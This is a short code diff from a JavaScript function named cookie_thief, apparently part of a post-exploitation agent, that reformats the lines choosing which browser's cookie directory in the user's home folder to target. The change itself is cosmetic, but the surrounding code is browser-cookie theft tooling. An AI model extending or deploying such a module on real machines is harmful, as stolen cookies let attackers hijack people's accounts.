@@ -25,7 +25,10 @@ exports.cookie_thief = function(task, command, params){
     }
     cookiepath = homedir + username;
 
-    if(config.hasOwnProperty("browser") && typeof config['browser'] == 'string'){ browser = config['browser']; }
+    if(config.hasOwnProperty("browser") && typeof config['browser'] == 'string'){
+      browser = config['browser'];
+    }
+
     if(browser == "chrome") {
         cookiedir = chromeCookieDir;
     }
